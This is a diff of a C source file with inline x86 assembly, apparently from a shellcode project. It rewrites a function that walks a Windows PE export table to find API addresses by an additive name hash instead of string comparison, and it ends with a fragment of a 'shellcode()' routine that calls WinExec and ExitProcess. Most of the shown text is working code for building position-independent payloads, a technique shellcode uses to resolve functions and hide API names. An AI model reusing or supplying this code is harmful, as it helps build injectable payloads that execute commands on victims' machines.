@@ -127,102 +127,120 @@ DllBase는 LPVOID형식임으로 mov를 사용한다.
 
 */
 
-
-int GetApiAddress(int* base, int* _export, const char* FindApiName)
+int GetApiAddress(int* _ModuleAddress, int* ExportAddress, const char* Name)
 {
-	int FindApiNameLength;
-	for (FindApiNameLength = 0; FindApiName[FindApiNameLength] != 0; FindApiNameLength++);
+	int ModuleAddress = (int)_ModuleAddress;
 
-	int EAT; //Export Address Table
-	int NPT; //Name Pointer Table
-	int OT;	 //Ordinal Table
+	int FindName = 0;
+	int NameHash = 0;
 
-	//get info
-	int NumberOfFunction = *(_export + 6);
+	int Index = 0;
 
-	EAT = *(_export + 7); //sizeof(int) * 7 (28) Export Address Table RVA
-	NPT = *(_export + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
-	OT = *(_export + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA
-
-	//Get VA (Virtual Address)
-	NPT += (int)base;
-	OT += (int)base;
-	EAT += (int)base;
-
-	int* ptr = 0;
-	int index = 0;
-
-	//Name Pointer Table
-	for (;;)
+	//get string hash
+	__asm
 	{
-		//Get next API name
-		ptr = (int*)NPT + index;
-		index++;
+		xor eax, eax; 
+		xor ecx, ecx;
 
-		int IsCmp = TRUE;
+		mov ebx, Name;
 
-		//Get name length
-		int ApiStringLength = 0;
-		for (; ((char*)*ptr + (int)base)[ApiStringLength] != 0; ApiStringLength++);
+	_NAME_HASH:;
+		movsx edx, byte ptr[ebx + ecx];
+		add ecx, 1;
+		add eax, edx;
 
-		//String compare 
-		if (FindApiNameLength <= ApiStringLength)
-		{
-			for (int i = 0; i != ApiStringLength; i++)
-			{
-				if (((char*)*ptr + (int)base)[i] != FindApiName[i])
-				{
-					IsCmp = FALSE;
-					break;
-				}
-			}
+		cmp edx, 0;
+		jne _NAME_HASH;
 
-
-			if (IsCmp == TRUE)
-			{
-				//Successfully string compare
-				index--;
-
-				break;
-			}
-		}
+		mov NameHash, eax;
 	}
 
-	//Get ordinal
-	int LoopCount = 1;
-
-	int ExportAddressTableIndex = 0;
-	unsigned short** OrdinalPointer = (unsigned short**)&OT;
-
-	for (;;)
+	//find api name
+	__asm
 	{
-		*OrdinalPointer += 1;
+		mov eax, ExportAddress;
+		add eax, 32;
+		mov eax, [eax];
+		add eax, ModuleAddress;
 
-		if (LoopCount == index)
-		{
-			//Successfully get function ordinal
-			ExportAddressTableIndex = **OrdinalPointer;
-			break;
-		}
+		xor esi, esi;
 
-		LoopCount++;
+	_LOOP:;
+		mov ebx, [eax + esi * 4];
+		add ebx, ModuleAddress;
+		
+		xor ecx, ecx;
+		xor edi, edi;
+
+	__LOOP:;
+		movsx edx, byte ptr[ebx + ecx];
+
+		add edi, edx;
+		add ecx, 1;
+
+		cmp edx, 0;
+		jne __LOOP;
+
+		cmp edi, NameHash;
+		je BREAK_LABLE;
+
+		add esi, 1;
+
+		jmp _LOOP;
+
+	BREAK_LABLE:;
+
+		mov Index, esi;
+		mov FindName, ebx;
+	}
+	
+	int Ordinal = 0;
+
+	__asm
+	{
+		mov ebx, ExportAddress;
+		add ebx, 36;
+		mov ebx, [ebx];
+
+		mov eax, 2;
+		mov ecx, Index;
+		mul ecx;
+		
+		add ebx, eax;
+		add ebx, ModuleAddress;
+
+		movsx edx, word ptr[ebx];
+
+		//ordinal is started from one
+		add edx, 1;
+
+		mov Ordinal, edx;
 	}
 
-	//Get EA (Export Address)
-	LoopCount = 1;
-	int** ReferenceExportAddressTable = (int**)&EAT;
+	int address;
 
-	for (;;)
+	__asm
 	{
-		if (LoopCount == ExportAddressTableIndex)
-		{
-			break;
-		}
+		mov ebx, ExportAddress;
+		add ebx, 28;
+		mov ebx, [ebx];
 
-		LoopCount += 1;
+		add ebx, ModuleAddress;
+
+		mov eax, 4;
+		mov ecx, Ordinal;
+		mul ecx;
+		sub eax, 4;
+
+		add ebx, eax;
+
+		mov ebx, [ebx];
+		add ebx, ModuleAddress;
+
+		mov address, ebx;
 	}
 
-	return *(*ReferenceExportAddressTable + LoopCount) + (int)base; //return VA
+	return address;
 }
 
 void shellcode()
@@ -335,7 +353,7 @@ typedef struct _LSA_UNICODE_STRING {
 
 		call _WinExec;
 	}
-	
+
 	//call ExitProcess
 	((void (*) (unsigned int))_ExitProcess)(0);
 
